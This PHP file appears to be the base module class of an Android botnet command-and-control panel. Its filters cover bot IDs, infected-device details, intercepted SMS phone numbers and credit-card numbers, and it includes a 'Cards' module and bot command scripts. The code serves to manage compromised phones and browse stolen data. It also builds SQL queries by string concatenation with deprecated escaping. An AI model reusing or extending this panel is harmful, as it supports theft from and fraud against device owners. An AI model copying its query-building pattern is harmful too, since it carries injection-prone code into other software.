<?php
require_once "hlp.php";
require_once "pdo.php";

class modBase
{
	protected $debug = false;
	protected $results_on_page = 15;

	protected $module_name = 'base'; // should be overriden in each module
	//protected $filter_keys= array('tag', 'last_seen', 'android', 'bot_id', 'comment', 'operator', 'country');
	
	//   / - is php regex shit
	public static $filters = array(
		// bots
		'tag'=>'^[a-zA-Z0-9-_]{3,20}$',
		'time_connect' => '^[0-9]+$',
		'android' => '^[0-9.,]+$',
		'bot_id' => '^[a-zA-Z0-9,]+$',
		'comment' => '^.{1,20}$',
		'operator' => '^.{3,300}$',
		'country' => '^[a-zA-Z, ]{1,50}$',
		'appname' => '^[a-zA-Z0-9., ]{1,200}$',
		'email' => '^[\S]+@[\S]+.[a-zA-Z]{2,10}$',
		// sms
		'phone' => '^[0-9+]{3,20}$',
		'cc' => '^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35d{3})d{11})$',
		
		// generic
		'text' => '^.{3,300}$',
	);
	
	// it can not use 'value like("% val %") in SQL; only  'value = "val"''
	public static $filters_strict = array('tag', 'android', 'time_connect', 'bot_id', 'phone', 'cc', 'country');
	
	protected $db;
	protected $filter_values = array();
	protected $client_cfg = array();
	
	function __construct($db)
	{
		$this->db = $db;
		$this->hlp = new hlp();
	}
	
	function init($type, $filter_raw, $client_cfg)
	{
		if(!$this->db->is_connected)
			return $this->get_content_div("DB connection error");

		$this->filter_values = $this->clean_filter($filter_raw);
		//~ $this->load_config(); // load all options and vars from config.php
		$this->client_cfg = $client_cfg;
		
		if($type == 'content')
			$content = $this->get_content();
		else if($type == 'filter')
			$content = $this->get_filter();

		return $content;
	}

	function draw_tpl($tpl_name, $data=array())
	{
		$html = file_get_contents(dirname(__FILE__) . '/tpls/' . $tpl_name . '.html');
		
		if($data)
		foreach($data as $k=>$v)
		{
			$tag = '%'.strtoupper($k).'%';
			$html = str_replace($tag, $v, $html);
		}
		
		return $html;
	}
	
	function get_limit($total_rows, $rows_on_page)
	{
		$paging = array(
			'total_rows' => $total_rows,
			'pages' => 0,
			'page' => 1,
			'sql' => '',
		);
		
		if ($total_rows < $rows_on_page)
			return $paging;
		
		$num_pages = $total_rows / $rows_on_page;

		if($num_pages > round($num_pages))
			$num_pages = round(++$num_pages);
			
		if($num_pages < 2)
			$num_pages = 0;

		//~ elseif($num_pages < round($num_pages))
			//~ $num_pages = round(--$num_pages);
		//~ else
			//~ $num_pages = round($num_pages);
			
		$paging['page'] = hlp::get($_REQUEST, 'page', hlp::get($_COOKIE, "{$this->module_name}-page_num", 1));
		
		// if page in cookies larger than real elements count
		if($paging['page']*$rows_on_page > $total_rows)
			$paging['page'] = 1;
			
		$limit_from = ($paging['page'] - 1) * $rows_on_page;

		// mod to merge pages
		// 10+10+2 (3 pages) -> 10+12 (2 pages)
		if(($limit_from + $rows_on_page*2) > $total_rows)
			$rows_on_page = $total_rows;

		if($rows_on_page*$num_pages > $total_rows)
			$num_pages--;
		// mod end
		
		$paging['pages'] = $num_pages;
		$paging['sql'] = " LIMIT {$limit_from}, {$rows_on_page}";
		
		//~ echo print_r($paging, true);die;
		return $paging;
	}
	
	function get_content()
	{
		return '';
		// Implements in child class
		
		// USE $this->filter_values[$key] -- _cleaned_ data from filter form
	}
	
	//if you don't need filter - just remove function from your class
	function get_filter()
	{
		return '';
		
		// Implements in child class
		
		// USE $this->filter_values[$key] -- _cleaned_ data from filter form
		
		// EXAMPLE 1 - DYNAMIC GENERATED
		
		$fields = array(
			// id, name, placeholder, custom pattern (modBase::$filters['patt_name']), is_like (bool - for like('%%'))
			//~ array('bot_id', 'Bot ID', 'placeholder', null, true),
			array('bot_id', 'Bot ID', ''),
			array('bot_comment', 'Bot comment', ''),
			array('number', 'Phone number', '', modBase::$filters['phone']), // custom validation pattern is 4th parameter
			array('text', 'Text', ''),
		);
		
		return $this->build_filter($fields);
		
		
		// EXAMPLE 2 - Static (see tpls/filter_bots.html)

		$data = array();
		
		// list of fields is required
		$filter_keys = array('tag', 'time_connect', 'android', 'bot_id', 'comment', 'operator', 'country', 'appname');
		
		foreach($filter_keys as $key)
		{
			$data['filter_' . $key] = hlp::get($this->filter_values, $key, '');
			$data['patts_' . $key] = hlp::get(modBase::$filters, $key, modBase::$filters['text']);
		}
		
		$data['tag_list'] = $this->get_tag_select($data['filter_tag']);
		$data['last_seen_list'] = $this->get_last_seen_select($data['filter_time_connect']);
		
		$html = $this->draw_tpl('filter_bots', $data);
		return $this->get_filter_div($html);
	
	}
	
	// string title = 'Total: 5'
	// string content = body of the page / set it to '' to show message "No data" from no_data.html
	// int pages = number of pages total
	// array buttons = custom button for header, up to 9 in one line
	//		Example: 
	// array('Delete', 'Delete all selected items', 'deleteSms()', 'danger'),
	//		title		pop-up help					onclick			class
	
	function wrap_content($title, $content, $pages=0, $buttons=array())
	{
		$space_size = 12; // 2 for paging, 8 for 4 custom buttons (2 points each)
		$pager = "";
	
		if(!$content)
			$content = file_get_contents(dirname(__FILE__) . '/tpls/no_data.html');
			
		if($pages)
		{
			$pager = <<<PHP
			<div class="col-md-1">
				<select class="form-control" data-toggle="select" onchange="switch_page(this.options[this.selectedIndex].value)">
PHP;
			$cookie = "{$this->module_name}-page_num";
			$stored_page = hlp::get($_REQUEST, $cookie, hlp::get($_COOKIE, $cookie, 1));
			if($stored_page > $pages)
				$stored_page = 1;
				
			for ($i = 1; $i <= $pages; $i++)
				if($stored_page == $i)
					$pager .= "<option value='{$i}' selected>{$i}</option>";
				else
					$pager .= "<option value='{$i}'>{$i}</option>";
					
			$pager .= "</select></div>";
			$space_size -= 1;
		}
		
		$custom_buttons = "";
		if($buttons)
		foreach($buttons as $butt)
		{
			if(!$space_size)
				break;
				
			$button_width = 1;
			$sz = strlen(strip_tags($butt[0]));
			
			if($sz > 7)
				$button_width = round($sz/7);
			
			$custom_buttons .= <<<PHP
<div class='col-md-{$button_width}'>
		<button type='button' onclick='{$butt[2]}' title="{$butt[1]}" data-toggle="tooltip" class='btn btn-block btn-{$butt[3]}'>{$butt[0]}</button>
</div>
PHP;
			$space_size -= $button_width;
		}

		$title_width = 1;
		$sz = strlen(str_replace('&nbsp;', ' ', strip_tags($title)));
		if($sz > 7)
			$title_width = round($sz/7);
		
		$space_size -= $title_width;

		$data  = <<<PHP
	<form id='contentForm' method='post' style='margin-bottom: 100px'>
	<div class="col-md-12">
		<div class="tile navbar-inverse" style='text-align: left; border: 1px solid #eee'>
			
			<div class='row' style='margin-bottom: 5px'>
				<div class='col-md-{$title_width}'>{$title}</div>
				<div class='col-md-{$space_size}'>&nbsp;</div>
				{$custom_buttons}
				{$pager}
			</div>
			<div class='row'>
				<div class="col-md-12">{$content}</div>
			</div>
		</div>
	</div>
	</form>
PHP;
		
		return $this->get_debug() . $data;
	}
	
	function get_debug()
	{
		if(!$this->debug)
			return '';
			
		$sqls = '&bull; ' . implode("<br />&bull; ", $this->db->sqls);
		$cfg = print_r($this->client_cfg, true);
		$filter = print_r($this->filter_values, true);
		
		$html = <<<PHP
		<div style='width: 90%; margin: 0 auto; margin-bottom: 20px; border: 1px dotted yellow; padding: 10px' class='navbar navbar-inverse'>
		<p><b style='color: white; text-decoration: underline' onclick='$("#debugBody").toggle()'>Show debug</b></p>
		<div id='debugBody' style='display: none'>
			<p><b style='color: white'>SQLs</b></p>
			<p><div style='background-color: white; border-radius: 5px; padding: 5px; font-size: 10pt; font-family: Monospace'>{$sqls}</div></p>
			
			<p><b style='color: white'>Client config</b></p>
			<p><div style='background-color: white; border-radius: 5px; padding: 5px; font-size: 10pt; font-family: Monospace'>{$cfg}</div></p>
			
			<p><b style='color: white'>Clean filter</b></p>
			<p><div style='background-color: white; border-radius: 5px; padding: 5px; font-size: 10pt; font-family: Monospace'>{$filter}</div></p>
		</div>
		</div>
PHP;

		return $html;
	}
	
	function clean_filter($filter)
	{
		if(!$filter) return array();
		
		$vars = array();
		foreach($filter as $key=>$val)
		{
			$pref = $this->module_name."-filter-";
			$key = str_replace($pref, '', $key);
			
			if(!$this->validate_filter($key, $val))
				$vars[$key] = "";
			else
				$vars[$key] = $val;
		}
	
		return $vars;
	}

	function get_filter_div($data)
	{
		$div = <<<PHP

<div class="col-xs-12">
	<div class="navbar navbar-inverse navbar-embossed" style='padding: 10px'>
		{$data}
		<div style='clear: both'></div>
	</div>
</div>
PHP;
		return $div;
	}
	
	
	//~ $fields = array(
		// id, name, placeholder, custom pattern (modBase::$filters['patt_name'])
		//~ array('bot_id', 'Bot ID', 'placeholder'),
		//~ array('number', 'Phone number', ''),
		//~ array('text', 'Text', ''),
		
		// RAW html field example:   -- see in Cards module
		//~ $field = <<<PHP
//~ <div class="col-md-2 tagsinput-primary">
		//~ <input class="form-control tagsinput" id="cards-filter-country" pattern="{$patt}" 
			//~ size="10" placeholder="de, gb, fr" type="text" title="Use comma for multiply values: 1,2,3" data-role="tagsinput" value="%FILTER_COUNTRY%" />
	//~ </div>
//~ PHP;
			//~ array('Label', $field),
	//~ );
	// Up to 5 fields
	function build_filter($fields)
	{
		
		// if you added raw html fields (especially with tagsinput or other 
		// bootstrap/flatui features), you may need to re-init flatUI after ajax request
		// so enable $reinit_flatui option.
		$reinit_flatui = false;

		$html_titles = '<div class="row">';

		$html = '<div class="row">';
		$used_cols = 0;
		foreach($fields as $f)
		{
			// if elem is raw html: array('Cities', '<select><option>....</select>')
			preg_match("/col\-md\-([0-9]+)/", $f[1], $result); // parse field width from html element
			
			if(sizeof($result))
			{
				$reinit_flatui = true;
				
				$cols = $result[1][0];
				$html .= $f[1];
				
				$html_titles .= <<<PHP
	<div class="col-md-{$cols}" style='text-align: center'>
		<b style="color: white">{$f[0]}</b>
	</div>
PHP;
				$used_cols += $cols;
				continue;
			}
			
			// if has custom pattern
			if(sizeof($f) == 4)
				$patt = array_pop($f);
			else
				$patt = hlp::get(modBase::$filters, $f[0], modBase::$filters['text']);

			// has placeholder
			$placeholder = (sizeof($f) > 2)? $f[2] : '';

			$html .= <<<PHP
<div class="col-md-2">
	<input class="form-control" id="{$this->module_name}-filter-{$f[0]}" pattern="{$patt}" size="12" placeholder="{$placeholder}" type="text" value="" />
</div>
PHP;
			$html_titles .= <<<PHP
<div class="col-md-2" style='text-align: center'>
	<b style="color: white">{$f[1]}</b>
</div>
PHP;
			
			$used_cols += 2;
		}
		
		$html = $html_titles . "</div>" . $html;
		
		$left_cols = 12-2-$used_cols;
		if($left_cols)
			$html .= <<<PHP
<div class="col-md-{$left_cols}">&nbsp;</div>
PHP;

		$html .= <<<PHP
<div class="col-md-1" style='text-align: center'>
	<button onclick="apply_filter()" class="btn btn-block btn-success" title="Apply filter (Enter)"><i class="fa fa-filter marginRight10px"></i></button>
</div>
<div class="col-md-1">
	<button onclick='reset_filter()' class="btn btn-block btn-info" title="Reset filter and reload data"><i class="fa fa-eraser"></i></button>
</div></div>
PHP;

		if($reinit_flatui)
			$html .= "\n<script src='r/js/tagsinput_reinit.js'></script>";
		return $this->get_filter_div($html);
	}
	
	// simple Where generator for 1 table
	// $comma_accepted - fields, that may contain multiply values: 1,2,3,...
	// $filter - array('android', 'bot_id', 'appname', 'country')
	// $filter - 'piece of SQL'
	function addWhere($sql, $filter, $comma_accepted=array(), $table='')
	{
		if($table)
			$table = "`{$table}`.";
			
		// add $filter sql to main $sql
		if(is_string($filter))
		{
			if(stristr($sql, ' where '))
				return $sql . " AND " . $filter;
			else
				return $sql . " WHERE " . $filter;
		}
		
		$where = '';
		foreach($filter as $key=>$val)
		{
			if(!$this->validate_filter($key, $val))
				continue;
				
			$val = mysql_escape_string(trim($val));
			if(!$val)
				continue;
				
			// val can has multiply values
			if(in_array($key, $comma_accepted))
			{
				$vals = hlp::list2array($val);
				if(!$vals)
					continue;
					
				if(in_array($key, modBase::$filters_strict)){
					$val_list = implode("','", $vals);
					$where .= "{$table}`{$key}` in('{$val_list}') AND ";
				}else{
					$where .= '('; // logical block start
					foreach($vals as $val)
						$where .= "{$table}`{$key}` like('%{$val}%') OR ";
				
					// OR to AND on last element
					$where = substr($where, 0, strlen($where)-3).") AND "; // logical block end
				}
				
			// only one value
			}else{
			
				if(in_array($key, modBase::$filters_strict))
					$where .= "{$table}`{$key}` = '{$val}' AND ";
				else
					$where .= "{$table}`{$key}` like('%{$val}%') AND ";
			}
		}

		if($where == '')
			return $sql;
		else
		{
			if(stristr($sql, ' where '))
				return $sql . ' AND ' . substr($where, 0, strlen($where)-4);
			else
				return $sql . ' WHERE ' . substr($where, 0, strlen($where)-4);
		}
	}
	
	function validate_filter($key, $val)
	{
		if(!array_key_exists($key, modBase::$filters))
			return true;
			
		$regex = modBase::$filters[$key];

		if(preg_match('/'.$regex.'/', $val))
			return true;
		else
			return false;
	}
	
	// each row is an array
	// string will be appended:
	// '<th colspan="2" class="textcenter">Activity</th>'
	function get_table($rows, $headers=array(), $td_class='')
	{
		$html = "<table class='table table-bordered' style='background-color: #eee'>";
		
		if($headers)
		{
			$html .= "<tr>";
			foreach($headers as $header)
				$html .= "<th class='textcenter'>{$header}</th>";
			
			$html .= "</tr>";
		}
		
		foreach($rows as $row)
		{
			$html .= "<tr>";
			if(is_string($row))
			{
				$html .= $row . "</tr>";
				continue;
			}
			
			if(is_array($row) && sizeof($row))
			foreach($row as $elem)
			{
				$html .= "<td class='{$td_class}'>{$elem}</td>";
			}
			$html .= "</tr>";
		}
		
		$html .= "</table>";
		return $html;
	}
	
	// raw data from cookies
	// return boolean
	function check_user_ssid($login, $sessid, $ip)
	{
		if(!preg_match('#[\S]{1,64}#', $login))
			return false;
			
		$params = array(
			array(':login', $login, PDO::PARAM_STR, 64),
			array(':sessid', $sessid, PDO::PARAM_STR, 32),
		);
		
		$sessid_chk = md5($login . $ip . PASSWORD_MD5_SALT);
		if($sessid != $sessid_chk)
			return false;
			
		$result = $this->db->exec("SELECT * FROM users WHERE login = :login AND sessid = :sessid AND status='active'", $params, true);
		return (bool) (sizeof($result) == 1);
	}
	
	function clear_cookies()
	{
		// remove cookies
		setcookie("login", "", time() - 3600);
		setcookie("sessid", "", time() - 3600);
	}
	
	function show_main_page()
	{
		# load config
		$res = $this->db->exec("SELECT * FROM config", null, true, PDO::FETCH_ASSOC);
		$cnf = array();
		foreach($res as $r)
			$cnf[$r['name']] = $r['value'];

		$main_tpl = dirname(__FILE__) . "/tpls/main.html";
		$tpl = file_get_contents($main_tpl);
		
		$res = $this->db->exec("SELECT value FROM config WHERE name='mod_light'", null, true);
		$light_mode = $res[0]['value'];
		
		$c = new Commands();
		$tpl = str_replace('%COMMANDS%', $c->get_js($light_mode), $tpl);
		$time = str_replace(' ', '<br />', date("G:i d.m.Y"));
		$tpl = str_replace('%SERVER_TIME%', $time, $tpl);
		$tpl = str_replace('%RND%', 'by3', $tpl);

		foreach(glob(dirname(__FILE__) . "/tpls/block_*.html") as $file)
		{
			$light_file = str_replace('tpls/', 'tpls_light/', $file);
			
			if($light_mode && file_exists($light_file))
			{
				$val = file_get_contents($light_file);
				$tag = str_replace('.html', '', explode("/tpls_light/block_", $light_file, 2)[1]);
			}else{
				$val = file_get_contents($file);
				$tag = str_replace('.html', '', explode("/tpls/block_", $file, 2)[1]);
			}
			$tag = '%'.strtoupper($tag).'%';
			
			$tpl = str_replace($tag, $val, $tpl);
		}

		$tpl = str_replace('%USER%', $cnf['last_login'], $tpl);
		
		foreach($cnf as $key=>$val)
		{
			if(!hlp::startsWith($key, "mod_"))
				continue;
				
			$tpl = str_replace('%SHOW_' . strtoupper($key) . '%', ($val)? '' : ' style="display: none" ' , $tpl);
		}
		
		$show = ($cnf['last_login'] == 'admin')? '' : 'style="display: none"';
		$tpl = str_replace('%IS_ADMIN%', $show, $tpl);
		
		return $tpl;
	}
	
	// Usage: $tmp[] = $this->get_comment_cell($row);
	// don't forget to add new type to cmd_panel.save_comment() !
	function get_comment_cell($row)
	{
		$uniq_id = $this->module_name;
		
		$hide_field = $html = '';
		if(trim($row['comment']))
		{
			$hide_link = 'display: none;';
			$hide_field = '';
		}else{
			$hide_link = '';
			$hide_field = 'display: none;';
		}
		
		$html .= <<<PHP
	<center id='addlink-{$row['id']}' style='{$hide_link}'><a style='font-size: 12pt; text-decoration: none; border-bottom: 1px dotted #1abc9c' href="javascript:show_comment_area('addlink-{$row['id']}', '{$uniq_id}-{$row['id']}'); undefined">Add</a></center>

	<textarea rows='2' 
		class='form-control commentArea' 
		cols='10' 
		id="{$uniq_id}-{$row['id']}" 
		style='{$hide_field}' 
		onkeypress="show_save_button(this)" 
		onkeydown="show_save_button(this)">{$row['comment']}</textarea>
	<button id='button-{$uniq_id}-{$row['id']}' style='width: 100%; display: none' type='button' class='btn btn-info' onclick="save_comment('{$row['id']}', '{$uniq_id}')"><i class="fa fa-save" title=""></i></button>
PHP;
		return $html;
	}
	
}














